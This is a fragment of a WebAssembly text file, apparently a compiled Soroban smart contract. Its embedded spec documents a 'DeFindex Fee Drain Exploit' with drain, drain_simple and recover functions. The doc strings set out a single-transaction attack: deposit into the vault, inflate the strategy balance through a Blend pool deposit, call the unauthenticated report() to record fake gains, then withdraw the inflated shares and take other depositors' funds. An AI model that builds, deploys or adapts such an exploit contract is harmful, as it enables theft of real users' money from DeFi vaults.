  (@custom "contractspecv0" (after data) "\00\00\00\00\00\00\00HFull atomic drain: deposit \e2\86\92 spike \e2\86\92 report \e2\86\92 withdraw \e2\86\92 recover\00\00\00\05drain\00\00\00\00\00\00\06\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\05vault\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\00\00\00\00\0ablend_pool\00\00\00\00\00\13\00\00\00\00\00\00\00\0edeposit_amount\00\00\00\00\00\0b\00\00\00\00\00\00\00\0cspike_amount\00\00\00\0b\00\00\00\01\00\00\00\0b\00\00\00\00\00\00\00(Recover any tokens stuck in the contract\00\00\00\07recover\00\00\00\00\02\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\01\00\00\00\0b\00\00\00\02\00\00\01\ccDeFindex Fee Drain Exploit \e2\80\94 Atomic Contract\0a\0aPerforms the entire exploit in a SINGLE transaction:\0a1. Deposit USDC into DeFindex vault \e2\86\92 receive vault shares\0a2. Deposit USDC into Blend pool \e2\86\92 spikes strategy.balance()\0a3. Call vault.report() (NO AUTH) \e2\86\92 records fake gains\0a4. Withdraw ALL vault shares \e2\86\92 get inflated amount\0a5. Withdraw from Blend pool \e2\86\92 recover spike deposit\0a\0aNet result: more USDC out than in. Difference = other depositors' funds.\00\00\00\00\00\00\00\07DataKey\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\05Owner\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0ainitialize\00\00\00\00\00\01\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\00\00\00\00ESimple drain for vaults with existing gains \e2\80\94 no Blend spike needed\00\00\00\00\00\00\0cdrain_simple\00\00\00\04\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\05vault\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\00\00\00\00\0edeposit_amount\00\00\00\00\00\0b\00\00\00\01\00\00\00\0b")
  (@custom "contractenvmetav0" (after data) "\00\00\00\00\00\00\00\16\00\00\00\00")
  (@custom "contractmetav0" (after data) "\00\00\00\00\00\00\00\05rsver\00\00\00\00\00\00\061.92.0\00\00\00\00\00\00\00\00\00\08rssdkver\00\00\00022.0.11#34f7f53ae31e0fd02aab436a9872e79fa671ca02")
)
